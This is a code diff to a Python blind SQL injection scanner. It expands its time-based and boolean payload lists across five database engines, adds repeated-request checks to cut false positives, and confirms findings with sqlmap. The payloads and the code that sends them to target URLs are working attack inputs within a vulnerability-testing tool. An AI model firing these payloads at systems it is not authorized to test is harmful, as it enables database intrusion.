@@ -54,21 +54,62 @@ def blind_sqli_scanner(url: str, params: str = "") -> str:
 
     vulnerabilities = []
 
-    # Time-based payloads (per DB)
+    # ── COMPREHENSIVE TIME-BASED PAYLOADS ─────────────────────────────────────
     time_payloads = [
+        # MySQL
         ("' AND SLEEP(4)-- -", "MySQL"),
         ("1 AND SLEEP(4)-- -", "MySQL"),
-        ("'; SELECT pg_sleep(4)-- -", "PostgreSQL"),
-        ("1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
         ("' OR SLEEP(4)-- -", "MySQL"),
         ("1' AND SLEEP(4)#", "MySQL"),
+        ("' AND SLEEP(4)#", "MySQL"),
+        ("1 AND SLEEP(4)#", "MySQL"),
+        ("' OR SLEEP(4)#", "MySQL"),
+        ("'; SELECT SLEEP(4)-- -", "MySQL"),
+        ("1; SELECT SLEEP(4)-- -", "MySQL"),
+        ("' AND (SELECT * FROM (SELECT(SLEEP(4)))a)-- -", "MySQL"),
+        ("' AND BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
+        ("1 AND BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
+        ("' OR BENCHMARK(10000000,SHA1('test'))-- -", "MySQL"),
+        ("' AND (SELECT CASE WHEN (1=1) THEN SLEEP(4) ELSE 0 END)-- -", "MySQL"),
+        ("1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(4) ELSE 0 END)-- -", "MySQL"),
+        # PostgreSQL
+        ("'; SELECT pg_sleep(4)-- -", "PostgreSQL"),
+        ("1; SELECT pg_sleep(4)-- -", "PostgreSQL"),
+        ("' OR pg_sleep(4)-- -", "PostgreSQL"),
+        ("1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)-- -", "PostgreSQL"),
+        ("' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END)-- -", "PostgreSQL"),
+        # MSSQL
+        ("1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
+        ("'; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
+        ("' OR 1=1; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
+        ("1 AND 1=(SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:4' ELSE 0 END)-- -", "MSSQL"),
+        # Oracle
+        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
+        ("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
+        ("' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)-- -", "Oracle"),
+        # SQLite
+        ("' AND 1=randomblob(400000000)-- -", "SQLite"),
+        ("1 AND 1=randomblob(400000000)-- -", "SQLite"),
     ]
 
-    # Boolean-based payloads (true vs false condition)
+    # ── COMPREHENSIVE BOOLEAN-BASED PAYLOADS ──────────────────────────────────
     boolean_payloads = [
-        ("' AND '1'='1", "' AND '1'='2"),  # true vs false
+        # Standard true/false pairs
+        ("' AND '1'='1", "' AND '1'='2"),
         ("1 AND 1=1", "1 AND 1=2"),
         ("' OR 1=1-- -", "' OR 1=2-- -"),
+        ("1' AND '1'='1'-- -", "1' AND '1'='2'-- -"),
+        ("1 AND 1=1-- -", "1 AND 1=2-- -"),
+        ("' AND 1=1-- -", "' AND 1=2-- -"),
+        ("1 AND 'a'='a'-- -", "1 AND 'a'='b'-- -"),
+        ("' AND 'a'='a'-- -", "' AND 'a'='b'-- -"),
+        ("1 AND SUBSTRING('abc',1,1)='a'-- -", "1 AND SUBSTRING('abc',1,1)='b'-- -"),
+        ("' AND SUBSTRING('abc',1,1)='a'-- -", "' AND SUBSTRING('abc',1,1)='b'-- -"),
+        # Subquery-based
+        ("1 AND (SELECT 1 FROM dual WHERE 1=1)=1-- -", "1 AND (SELECT 1 FROM dual WHERE 1=2)=1-- -"),
+        ("' AND (SELECT COUNT(*) FROM users WHERE 1=1)>0-- -", "' AND (SELECT COUNT(*) FROM users WHERE 1=2)>0-- -"),
+        # Time-delay confirmation (short delay)
+        ("' AND (SELECT CASE WHEN (1=1) THEN SLEEP(1) ELSE 0 END)-- -", "' AND (SELECT CASE WHEN (1=2) THEN SLEEP(1) ELSE 0 END)-- -"),
     ]
 
     logger.add_log(tool_name, "PROCESSING", "Testing time-based blind SQLi")
@@ -76,38 +117,92 @@ def blind_sqli_scanner(url: str, params: str = "") -> str:
         if check_cancelled(logger): break
         for payload, db_type in time_payloads:
             try:
-                rate_limiter.wait(domain)
-                start = time.monotonic()
-                r = requests.get(
-                    f"{url}?{param}={quote(payload)}",
-                    timeout=10, verify=False
-                )
-                elapsed = time.monotonic() - start
+                # ── TIME CONSISTENCY CHECK ─────────────────────────────────
+                # Kirim 3x buat pastikan delay konsisten, bukan jitter
+                delays = []
+                for attempt in range(3):
+                    rate_limiter.wait(domain)
+                    start = time.monotonic()
+                    r = requests.get(
+                        f"{url}?{param}={quote(payload)}",
+                        timeout=10, verify=False
+                    )
+                    elapsed = time.monotonic() - start
+                    delays.append(elapsed)
 
-                if elapsed >= 3.5:
+                # Cek konsistensi: semua delay harus > threshold
+                threshold = 3.5
+                consistent_delays = [d for d in delays if d >= threshold]
+                all_slow = len(consistent_delays) == 3
+                majority_slow = len(consistent_delays) >= 2
+
+                if all_slow:
+                    # Semua request lambat = confirmed
+                    avg_delay = sum(delays) / len(delays)
                     vulnerabilities.append({
                         "parameter": param,
                         "payload": payload,
                         "db_type": db_type,
                         "type": "Blind SQLi (Time-Based)",
-                        "evidence": f"Response delayed {elapsed:.1f}s",
-                        "severity": "Critical"
+                        "evidence": f"Consistent delay: {avg_delay:.1f}s avg (3/3 slow)",
+                        "severity": "Critical",
+                        "confidence": "high",
                     })
                     logger.add_log(tool_name, "WARNING",
-                        f"Blind SQLi (time) confirmed: param={param}, DB={db_type}, delay={elapsed:.1f}s")
-                    break  # confirmed for this param
+                        f"Blind SQLi (time) confirmed: param={param}, DB={db_type}, avg_delay={avg_delay:.1f}s")
+                    break
+                elif majority_slow:
+                    # 2/3 lambat = kemungkinan besar TP tapi less confident
+                    avg_delay = sum(delays) / len(delays)
+                    vulnerabilities.append({
+                        "parameter": param,
+                        "payload": payload,
+                        "db_type": db_type,
+                        "type": "Blind SQLi (Time-Based, Partial)",
+                        "evidence": f"Partial delay: {avg_delay:.1f}s avg (2/3 slow)",
+                        "severity": "High",
+                        "confidence": "medium",
+                    })
+                    logger.add_log(tool_name, "WARNING",
+                        f"Blind SQLi (time) partial: param={param}, DB={db_type}, {len(consistent_delays)}/3 slow")
+                    break
+                else:
+                    # Kurang dari 2/3 lambat = kemungkinan jitter/FP
+                    logger.add_log(tool_name, "INFO",
+                        f"Time test {param} inconclusive: only {len(consistent_delays)}/3 slow (likely jitter)")
+                    continue
+
             except requests.Timeout:
-                # Timeout can also indicate successful sleep injection
-                vulnerabilities.append({
-                    "parameter": param,
-                    "payload": payload,
-                    "db_type": db_type,
-                    "type": "Blind SQLi (Time-Based, Timeout)",
-                    "evidence": "Request timed out — potential successful sleep injection",
-                    "severity": "Critical"
-                })
-                logger.add_log(tool_name, "WARNING", f"Blind SQLi timeout: param={param}")
-                break
+                # ── TIMEOUT CONSISTENCY CHECK ───────────────────────────────
+                # Timeout juga harus dikirim 2x buat konsistensi
+                timeout_count = 0
+                for _ in range(2):
+                    try:
+                        rate_limiter.wait(domain)
+                        requests.get(
+                            f"{url}?{param}={quote(payload)}",
+                            timeout=10, verify=False
+                        )
+                    except requests.Timeout:
+                        timeout_count += 1
+                    except Exception:
+                        pass
+
+                if timeout_count >= 2:
+                    vulnerabilities.append({
+                        "parameter": param,
+                        "payload": payload,
+                        "db_type": db_type,
+                        "type": "Blind SQLi (Time-Based, Timeout)",
+                        "evidence": f"Consistent timeout: {timeout_count + 1}/3 attempts",
+                        "severity": "Critical",
+                        "confidence": "high",
+                    })
+                    logger.add_log(tool_name, "WARNING", f"Blind SQLi timeout confirmed: param={param}")
+                    break
+                else:
+                    logger.add_log(tool_name, "INFO",
+                        f"Timeout test {param} inconclusive: only {timeout_count + 1}/3 timeouts")
             except Exception:
                 pass
 
@@ -142,6 +237,35 @@ def blind_sqli_scanner(url: str, params: str = "") -> str:
                     break
             except Exception:
                 pass
+
+    # ── SQLMAP CONFIRMATION STEP ──────────────────────────────────────────────
+    if vulnerabilities:
+        from tools.custom_tools import _run_sqlmap_confirmation
+        confirmed_vulnerabilities = []
+        
+        for vuln in vulnerabilities:
+            param = vuln["parameter"]
+            logger.add_log(tool_name, "PROCESSING", f"Running sqlmap confirmation on {param}")
+            
+            sqlmap_result = _run_sqlmap_confirmation(url, param, logger)
+            
+            if sqlmap_result.get("is_confirmed"):
+                vuln["sqlmap_confirmed"] = True
+                vuln["severity"] = sqlmap_result.get("severity", "Critical")
+                vuln["db_type"] = sqlmap_result.get("db_type", vuln.get("db_type", "Unknown"))
+                vuln["injection_details"] = sqlmap_result.get("injection_details", [])
+                confirmed_vulnerabilities.append(vuln)
+                logger.add_log(tool_name, "WARNING",
+                    f"sqlmap CONFIRMED: {param} is vulnerable ({vuln['db_type']})")
+            else:
+                vuln["sqlmap_confirmed"] = False
+                vuln["severity"] = "Medium"
+                vuln["note"] = "Detected by custom scanner, not confirmed by sqlmap"
+                confirmed_vulnerabilities.append(vuln)
+                logger.add_log(tool_name, "INFO",
+                    f"sqlmap: {param} not confirmed - keeping as medium confidence finding")
+        
+        vulnerabilities = confirmed_vulnerabilities
 
     result = {
         "status": "VULNERABLE" if vulnerabilities else "SAFE",
